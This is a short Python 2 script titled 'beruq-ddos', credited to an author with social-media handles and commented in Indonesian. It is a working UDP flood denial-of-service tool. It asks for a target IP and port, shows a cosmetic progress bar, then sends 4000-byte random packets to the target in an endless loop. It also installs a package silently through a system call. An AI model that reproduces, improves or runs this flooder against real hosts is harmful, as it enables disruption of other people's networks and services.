import os
import sys
import socket
import random
import time


socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(4000)

os.system("apt install figlet -y")
os.system("figlet beruq-ddos")

print "   \         ,        , "
print "    \       /(        )` "
print "     \      \ \___   / | "
print "            /- _  `-/  ' "
print "           (/\/ \ \   /\ "
print "           / /   | `    \ "
print "           O O   ) /    | "
print "           `-^--'`<     ' "
print "          (_.)  _  )   / "
print "           `.___/`    / "
print "             `-----' / "
print "<----.     __ / __   \ "
print "<----|====O)))==) \) /====>"
print "<----'    `--' `.__,' \ "
print "             |        | "
print "              \       / "
print "        ______( (_  / \______ "
print "      ,'  ,-----'   |        \ "
print "      `--{__________)        \/ "

print "[==============================]"
print "Coder : IrvanBeruq "
print "Fb : https://facebook.com/like.a.code"
print "IG : irvanprmna"
print "[==============================]"

ipnya = raw_input("masukan ip nya: ")
portnya = input("Port       : ")
sent = 0

os.system("clear")
os.system("toilet Attack Starting")
print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(2)
print "[==========          ] 50%"
time.sleep(2)
print "[===============     ] 75%"
time.sleep(2)
print "[====================] 100%"
time.sleep(2)

while True:
    socket.sendto(bytes, (ipnya,portnya))
    sent = sent + 1
    print "Mengirim %s packet ke %s pada port:%s"%(sent,ipnya,portnya)
   